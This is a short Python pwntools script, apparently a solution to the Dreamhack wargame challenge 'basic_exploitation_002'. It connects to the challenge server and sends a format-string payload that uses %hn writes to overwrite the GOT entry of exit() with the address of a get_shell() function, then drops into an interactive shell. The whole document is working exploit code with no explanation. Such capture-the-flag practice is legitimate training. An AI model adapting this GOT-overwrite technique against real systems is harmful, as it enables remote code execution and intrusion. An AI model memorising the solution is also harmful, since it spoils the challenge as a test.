from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/basic_exploitation_002')
else:
    r = remote('host1.dreamhack.games', 12914)

get_shell = 0x8048609  # get_shell()
exit_got = 0x804a024  # GOT of exit()

get_shell_high = get_shell >> 16  # high 2bytes of get_shell()
get_shell_low = get_shell & 0xffff  # low 2bytes of get_shell()

payload = '%' + str(get_shell_low) + 'c%9$hn'
payload += '%' + str(0x10000 + get_shell_high - get_shell_low) + 'c%10$hn'
payload = payload.ljust(0x1f, 'a').encode()
payload += b'b'
payload += p32(exit_got)
payload += p32(exit_got + 2)

r.send(payload)
r.recvuntil('b')

r.interactive()